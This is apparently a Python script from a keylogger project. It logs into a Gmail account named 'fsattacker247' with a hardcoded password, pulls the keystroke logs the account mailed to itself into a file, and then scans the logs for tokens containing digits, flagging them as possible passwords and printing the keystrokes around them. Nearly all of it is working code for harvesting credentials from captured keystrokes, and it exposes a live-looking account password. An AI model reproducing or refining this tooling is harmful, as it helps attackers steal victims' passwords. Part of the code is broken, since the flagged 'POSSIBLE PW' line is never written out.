# Extract Mail
import imaplib
import email

username = "fsattacker247@gmail.com"
password = "FS123456789"

mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(username, password)

mail.select("inbox")

result, data = mail.uid('search', None, "ALL")

inbox_item = data[0].split()

for log in inbox_item:
    result2, email_data = mail.uid('fetch', log, '(RFC822)')
    raw_email = email_data[0][1].decode("utf-8")
    email_message = email.message_from_string(raw_email)
    from_ = email_message['From']
    if from_ == username:
        email_string = str(email_message)
        email_split = email_string.split("\n")
        with open("log.txt", "a") as f:
            f.write(str(email_split[11:-1]))


### PART II ###
# Create Key Parser
log_file = "C:/Users/bradl/OneDrive/Folder/Git/log.txt"

trail = 5

numList = ['0','1', '2', '3', '4', '5', '6', '7', '8', '9']
with open (log_file, "r") as file:
    data = file.read()
    data = data[1:-1]
    data = data.replace(" ", "").replace("[", "").replace("]", "").split("<SPACE>")
    # data = data.replace("[", "")
    # data = data.replace("]", "")
    # data = data.split("<SPACE>")
    file.close()

with open ("possiblePW.txt", "w") as f:   
    for i in range(len(data)):
        for char in data[i]:
            if char in numList:
                (f"POSSIBLE PW: {data[i]}")
                for n in range(1,trail + 1):
                    print (data[i - n])